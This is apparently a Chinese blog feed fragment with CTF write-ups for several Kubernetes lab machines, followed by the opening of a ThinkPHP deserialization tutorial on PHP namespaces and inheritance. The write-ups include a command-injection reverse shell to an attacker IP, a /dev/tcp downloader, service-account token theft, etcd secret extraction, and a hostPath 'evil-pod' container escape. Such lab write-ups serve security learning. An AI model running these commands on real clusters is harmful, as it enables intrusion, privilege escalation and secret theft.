    <content type="html"><![CDATA[<h2 id="Kubernetes-for-Everyone"><a href="#Kubernetes-for-Everyone" class="headerlink" title="Kubernetes for Everyone"></a>Kubernetes for Everyone</h2><p>fscan 输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.58.32     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">10.10.58.32:111 open</span><br><span class="line">10.10.58.32:22 open</span><br><span class="line">10.10.58.32:3000 open</span><br><span class="line">10.10.58.32:5000 open</span><br><span class="line">10.10.58.32:6443 open</span><br><span class="line">[*] alive ports len is: 5</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://10.10.58.32:5000   code:200 len:887    title:Etch a Sketch</span><br><span class="line">[*] WebTitle: http://10.10.58.32:3000   code:302 len:29     title:None 跳转url: http://10.10.58.32:3000/login</span><br><span class="line">[*] WebTitle: https://10.10.58.32:6443  code:401 len:157    title:None</span><br><span class="line">[*] WebTitle: http://10.10.58.32:3000/login code:200 len:28034  title:Grafana</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123145853723.png" alt="image-20240123145853723"></p><p>8.3.0存在任意文件读取的洞</p><p><img src="../images/image-20240123150003340.png" alt="image-20240123150003340"></p><p>这最后一行可以留个印象  等会会用到</p><p>5000端口</p><p><img src="../images/image-20240123150136733.png" alt="image-20240123150136733"></p><p>这个注释有东西 </p><p><img src="../images/image-20240123150258265.png" alt="image-20240123150258265"></p><p>访问该网站  得到了这个base32加密的东西 </p><p>解密得到  vagrant  (用户名)</p><p>上面的留意的那个是密码 然后ssh登录上去</p><p><img src="../images/image-20240123150543566.png" alt="image-20240123150543566"></p><p>k0s (k8s 轻量版), kine (etcd), 还有 docker   </p><p>etcd 可以理解为数据库  里面存一些配置文件啥的</p><p>k8s相当于docker  pods相当于docker里的容器</p><p>这里将数据库拖到本地看  因为这个玩意太卡了</p><p><img src="../images/image-20240123150822438.png" alt="image-20240123150822438"></p><p><img src="../images/image-20240123150907144.png" alt="image-20240123150907144"></p><p>开个服务传到本地就行了</p><p>根据提示去 secrets 里面找内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,hex(value) from kine where name like &#x27;%/registry/secrets/default/%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123151124810.png" alt="image-20240123151124810"></p><p><img src="../images/image-20240123151142011.png" alt="image-20240123151142011"></p><p>然后本地解码一下 </p><p><img src="../images/image-20240123151418110.png" alt="image-20240123151418110"></p><p><img src="../images/image-20240123151405052.png" alt="image-20240123151405052"></p><p>一般在 kube-system 里面的 pod 都是 k8s 自己的服务, 并且会有一段随机后缀  </p><p>但是这里没</p><p><img src="../images/image-20240123151742053.png" alt="image-20240123151742053"></p><p>读取一下里面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(value) from kine where name like &#x27;%/registry/pods/kube-system/kube-api%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123151841121.png" alt="image-20240123151841121"></p><p>这里其实也是对hex编码  然后我们还是挨个解码  并且访问</p><p>这里解码得出  <a href="https://hub.docker.com/r/csaju/jokes">https://hub.docker.com/r/csaju/jokes</a></p><p>我们将其docker pull 一下  拉到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --entrypoint /bin/bash csaju/jokes</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123152250591.png" alt="image-20240123152250591"></p><p>查看git日志  然后挨个看看提交了什么</p><p>​    <img src="../images/image-20240123152318902.png" alt="image-20240123152318902"></p><p>flag到手</p><p>最后需要找 interview 什么的</p><p>发现 <code>internship-job-5drbm</code> 的 pod</p><p><img src="../images/image-20240123152556053.png" alt="image-20240123152556053"></p><p>去读取他的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(value) from kine where name like &#x27;%/registry/pods/internship/internship-job-5drbm%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240123152630373.png" alt="image-20240123152630373"></p><p>还是一样去解码</p><p>这里用一下xz师傅的图</p><p><img src="../images/image-20240123152655738.png" alt="image-20240123152655738"></p><h2 id="Insekube"><a href="#Insekube" class="headerlink" title="Insekube"></a>Insekube</h2><p><img src="../images/image-20240124092831717.png" alt="image-20240124092831717"></p><p>这傻逼靶机也出问题了  就是80端口扫不出来  直接80端口访问是可以的</p><p><img src="../images/image-20240124093043052.png" alt="image-20240124093043052"></p><p>一个ping命令的RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;bash -i &gt;&amp; /dev/tcp/10.14.53.199/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124093108489.png" alt="image-20240124093108489"></p><p><img src="../images/image-20240124093142096.png" alt="image-20240124093142096"></p><p>环境变量中有flag   然后也发现了  其使用K8s来管理这些容器  说明我们现在也在容器中  没在真正的服务器里</p><p>上传kubectl</p><p><img src="../images/image-20240124093839741.png" alt="image-20240124093839741"></p><p>查看开了哪些容器看不了  然后就看一下开了哪些权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./kubectl get pods</span><br><span class="line">./kubectl auth can-i --list</span><br></pre></td></tr></table></figure><p>发现这里这个secrets可以读</p><p><img src="../images/image-20240124093948202.png" alt="image-20240124093948202"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* get secrets</span><br></pre></td></tr></table></figure><p>接着读这个flag</p><p><img src="../images/image-20240124094039732.png" alt="image-20240124094039732"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kube* get secrets secretflag -o json</span><br><span class="line"></span><br><span class="line">//将结果以json的格式进行输出  base64解码就能拿到flag了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124095344016.png" alt="image-20240124095344016"></p><p>查看环境变量发现存在个内网的GRAFANA  上个代理出来访问</p><p><img src="../images/image-20240124095702695.png" alt="image-20240124095702695"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/run/secrets/kubernetes.io/serviceaccount/token</span><br><span class="line"></span><br><span class="line">//这个是服务账户的令牌位置  (一般是最高权限了)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124100007465.png" alt="image-20240124100007465"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* get pods --token $token</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124100056144.png" alt="image-20240124100056144"></p><p>出现这个的话就是代表着有了最高权限了   我们进入到grafana这个容器内</p><p><img src="../images/image-20240124100248729.png" alt="image-20240124100248729"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* exec -it grafana-57454c95cb-f9js5 bash --token $token</span><br></pre></td></tr></table></figure><p>第三个flag到位了 </p><p>最后一步进行k8s逃逸  (其实和docker逃逸差不多)</p><p>先获取一下镜像名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl get pods --all-namespaces -o=jsonpath=&#x27;&#123;range .items[*].spec.containers[*]&#125;&#123;.image&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124100528405.png" alt="image-20240124100528405"></p><p>这里选的是这个syringe:latest</p><p>evil-pod.yaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: evil-pod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: syringe:latest</span><br><span class="line">    name: evil-container</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /host</span><br><span class="line">      name: evil-volume</span><br><span class="line">  volumes:</span><br><span class="line">  - name: evil-volume</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br></pre></td></tr></table></figure><p>上传到容器内</p><p><img src="../images/image-20240124100759671.png" alt="image-20240124100759671"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* apply -f evil* --token $token</span><br></pre></td></tr></table></figure><p>然后运行  新建一个容器  /host目录挂载着这个逃逸出来主机的根目录</p><p><img src="../images/image-20240124100912560.png" alt="image-20240124100912560"></p><p>然后进入这个主机内</p><p><img src="../images/image-20240124101005758.png" alt="image-20240124101005758"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kube* exec -it evil-pod bash --token $token</span><br></pre></td></tr></table></figure><p>这样就全部结束了</p><h2 id="Frank-and-Herby-try-again…"><a href="#Frank-and-Herby-try-again…" class="headerlink" title="Frank and Herby try again….."></a>Frank and Herby try again…..</h2><p>fscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.101.251   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">10.10.101.251:22 open</span><br><span class="line">10.10.101.251:10255 open</span><br><span class="line">10.10.101.251:10250 open</span><br><span class="line">10.10.101.251:10257 open</span><br><span class="line">10.10.101.251:10259 open</span><br><span class="line">10.10.101.251:16443 open</span><br><span class="line">10.10.101.251:25000 open</span><br><span class="line">10.10.101.251:30679 open</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124103458009.png" alt="image-20240124103458009"></p><p>30679这个端口存在官方后门   直接找poc反弹shell</p><p><img src="../images/image-20240124103718385.png" alt="image-20240124103718385"></p><p><img src="../images/image-20240124103724913.png" alt="image-20240124103724913"></p><p><img src="../images/image-20240124103844826.png" alt="image-20240124103844826"></p><p>这里wget命令没法用  直接用自定义的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function DOWNLOAD() &#123;</span><br><span class="line">  url=$1</span><br><span class="line">  proto=&quot;http://&quot;</span><br><span class="line">  host=$&#123;url/$proto/&#125;</span><br><span class="line">  server=$&#123;host%%/*&#125;</span><br><span class="line">  path=$&#123;host#*/&#125;</span><br><span class="line">  DOC=/$&#123;path// /&#125;</span><br><span class="line">  HOST=$&#123;server/:*/&#125;</span><br><span class="line"></span><br><span class="line">  PORT=$&#123;server/*:/&#125;</span><br><span class="line">  [[ -n $&#123;PORT&#125; ]] || PORT=80</span><br><span class="line">  PORT=$(( PORT + 0 ))</span><br><span class="line"></span><br><span class="line">  exec 3&lt;&gt;/dev/tcp/$&#123;HOST&#125;/$&#123;PORT&#125;</span><br><span class="line">  echo -en &quot;GET $&#123;DOC&#125; HTTP/1.0\r\nHost: $&#123;HOST&#125;\r\n\r\n&quot; &gt;&amp;3</span><br><span class="line">  while IFS= read -r line ; do</span><br><span class="line">    [[ &quot;$&#123;line&#125;&quot; == $&#x27;\r&#x27; ]] &amp;&amp; break</span><br><span class="line">  done &lt;&amp;3</span><br><span class="line">  nul=&#x27;\0&#x27;</span><br><span class="line">  while IFS= read -d &#x27;&#x27; -r x || &#123; nul=&quot;&quot;; [ -n &quot;$x&quot; ]; &#125;; do</span><br><span class="line">    printf &quot;%s$&#123;nul&#125;&quot; &quot;$&#123;x&#125;&quot;</span><br><span class="line">  done &lt;&amp;3</span><br><span class="line">  exec 3&gt;&amp;-</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240124104132499.png" alt="image-20240124104132499"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOWNLOAD http://10.14.53.199:8000/kubectl &gt; kubectl</span><br></pre></td></tr></table></figure><p>在等这个下载过程中  发现这个kubectl还存在未授权访问  <strong>(10255端口)</strong></p><p><img src="../images/image-20240124104431424.png" alt="image-20240124104431424"></p><p>这里直接使用了这个镜像  </p><p><strong>(这里download下的好慢  感觉不如写个后门然后连蚁剑上传上去来的快)</strong></p><p><img src="../images/image-20240124105351477.png" alt="image-20240124105351477"></p><p>这个直接就是最高权限了  </p><p>网卡死了。。。。。。。。。。。。。。。</p><p>接下来直接就是和上面一样  逃逸就行了</p><p>也是看镜像   然后逃逸 就行了 </p><h2 id="PalsForLife"><a href="#PalsForLife" class="headerlink" title="PalsForLife"></a>PalsForLife</h2><p>感觉其他的都差不多  就这个稍微有点意思  </p><p>rustscan</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.19.196:22</span><br><span class="line">Open 10.10.19.196:6443</span><br><span class="line">Open 10.10.19.196:10250</span><br><span class="line">Open 10.10.19.196:30180</span><br><span class="line">Open 10.10.19.196:31112</span><br><span class="line">Open 10.10.19.196:31111</span><br></pre></td></tr></table></figure><p>挨个访问  挨个扫一下目录</p><p>31111  gitea</p><p>30180  <code>/team</code>     dirsearch</p><p><img src="../images/image-20240126141306393.png" alt="image-20240126141306393"></p><p>将这个base64编码解码后转化输出给PDF文件</p><p><img src="../images/image-20240126141411247.png" alt="image-20240126141411247"></p><p>使用john工具来爆破一下密码</p><p><img src="../images/image-20240126141615560.png" alt="image-20240126141615560"></p><p>爆破密码</p><p><img src="../images/image-20240126141625324.png" alt="image-20240126141625324"></p><p>查看</p><p><img src="../images/image-20240126141642101.png" alt="image-20240126141642101"></p><p>pdf内容</p><p><img src="../images/image-20240126141716751.png" alt="image-20240126141716751"></p><p>不知道有啥用   接着去看gitea这个web页面  31111端口</p><p><img src="../images/image-20240126141809240.png" alt="image-20240126141809240"></p><p>发现有个用户  尝试登录一下  使用pdf爆出来的字符串</p><p><img src="../images/image-20240126141847933.png" alt="image-20240126141847933"></p><p>登录成功后发现有个私有仓库 </p><p><img src="../images/image-20240126141938264.png" alt="image-20240126141938264"></p><p>仓库的webhooks里就有个flag</p><p>然后查到这个gitea版本存在有个hook—RCE</p><p><a href="https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce">https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce</a></p><p>跟着来打就行了   这里新打的时候有个坑  就是邮件账户需要配置正确  不然会失败</p><p><img src="../images/image-20240126142917114.png" alt="image-20240126142917114"></p><p><img src="../images/image-20240126143023021.png" alt="image-20240126143023021"></p><p>第二个flag</p><p><img src="../images/image-20240126143534010.png" alt="image-20240126143534010"></p><p>直接给了管理员权限  然后直接逃逸</p><p><img src="../images/image-20240126143929414.png" alt="image-20240126143929414"></p><p>查看一下镜像  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods --all-namespaces -o=jsonpath=&#x27;&#123;range .items[*].spec.containers[*]&#125;&#123;.image&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span><br></pre></td></tr></table></figure><p>evil-pod.yaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: evil-pod</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - image: nginx</span><br><span class="line">    name: evil-container</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - mountPath: /host</span><br><span class="line">      name: evil-volume</span><br><span class="line">  volumes:</span><br><span class="line">  - name: evil-volume</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br></pre></td></tr></table></figure><p>这里用的是这个nginx这个镜像 </p><p><img src="../images/image-20240126144205643.png" alt="image-20240126144205643"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kube* apply -f evil-pod.yaml    //创建容器</span><br><span class="line"></span><br><span class="line">./kube* get pods //查看容器</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240126144304547.png" alt="image-20240126144304547"></p><p>进入到容器内</p><p><img src="../images/image-20240126144757619.png" alt="image-20240126144757619"></p><p>拿到最后一个flag了  突然发现还有一个  猜测是在secret中</p><p><img src="../images/image-20240126145058000.png" alt="image-20240126145058000"></p><p><img src="../images/image-20240126145110570.png" alt="image-20240126145110570"></p><p>查看这个flag文件</p><p><img src="../images/image-20240126145131842.png" alt="image-20240126145131842"></p><p><code>-n</code>指定命名空间    <code>-o</code> 指定输出格式</p><p>然后解码就行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kubernetes-for-Everyone&quot;&gt;&lt;a href=&quot;#Kubernetes-for-Everyone&quot; class=&quot;headerlink&quot; title=&quot;Kubernetes for Everyone&quot;&gt;&lt;/a&gt;Kubernetes for Ev</summary>
      
    
    
    
    
    <category term="K8s" scheme="https://ke1nys.github.io/tags/K8s/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp反序列化</title>
    <link href="https://ke1nys.github.io/posts/1372eab4.html"/>
    <id>https://ke1nys.github.io/posts/1372eab4.html</id>
    <published>2024-01-17T06:56:28.000Z</published>
    <updated>2024-01-20T15:32:19.405Z</updated>
    
    <content type="html"><![CDATA[<p>实习的时候审代码发现自己对这种反序列化链的寻找能力不太行  于是去找个thinkphp的链子来学习学习</p><p>参考文章  <a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/</a></p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>这里先补充一下基础的知识</p><p>namespace等等反序列化链中常见的东西</p><h2 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h2><p><strong>namespace实际上就是命名空间，在php类与对象这一章节中用到了命名空间这个概念</strong></p><p>我们可以把namespace理解为一个单独的空间，子命名空间就是使用 <code>\</code>来进行划分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//例如</span><br><span class="line"></span><br><span class="line">namespace npm  这就是一个单独的空间</span><br><span class="line"></span><br><span class="line">namespace npm\a  a就是子空间了  就是在npm这个空间里面划分</span><br></pre></td></tr></table></figure><p>用代码来解释一下</p><p><img src="../images/image-20240117153950615.png" alt="image-20240117153950615"></p><p>这里的话npm就是个命名空间   A的话就是被划分的子空间了</p><p>这里如果存在多个命名空间的话  我们可以使用<code>use</code>来进行调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">A</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;aaaaaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">B</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">npm</span>\<span class="title">A</span>\<span class="title">a</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;bbbbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117154339592.png" alt="image-20240117154339592"></p><p>还有一个是可以使用  <code>as</code> 就是做别名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">A</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;aaaaaa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">npm</span>\<span class="title class_">B</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">npm</span>\<span class="title">A</span>\<span class="title">a</span> <span class="keyword">as</span> <span class="title">xixi</span>;</span><br><span class="line"><span class="comment">//就是这里</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;bbbbb&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xixi</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117155130647.png" alt="image-20240117155130647"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>这里直接复制boo的了  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Json&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">30</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hobby</span>=<span class="string">&quot;game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am father \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i got smoke \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am son \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parentsay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$son</span>=<span class="keyword">new</span> <span class="title function_ invoke__">son</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">smoke</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">parentsay</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$son</span>-&gt;hobby;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240117155352348.png" alt="image-20240117155352348"></p><p>其实和java差不多  所以就不多讲了</p><h2 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h2><p>trait修饰符使得被修饰的类可以进行复用，增加了代码的可复用性，使用这个修饰符就可以在一个类包含另一个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 